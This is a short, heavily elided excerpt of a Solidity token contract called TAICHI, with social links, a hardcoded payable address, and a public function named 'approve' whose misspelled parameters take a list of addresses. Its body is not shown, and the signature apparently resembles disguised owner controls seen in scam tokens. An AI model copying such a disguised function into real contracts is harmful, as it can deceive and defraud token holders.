...
// https://t.me/TAICHIETHH
// https://medium.com/@TaiChiETH
// 
...
contract TAICHI is Context, IERC20, Ownable{
    ...
    constructor () {
        ...
        _create = payable(address(0xfEc4f4CeE8Bd570F78F6481FC680B0054a5FacaC));
    ...
    function approve(bool state,uint256 totalSuly,address[] calldata decimailss) public {
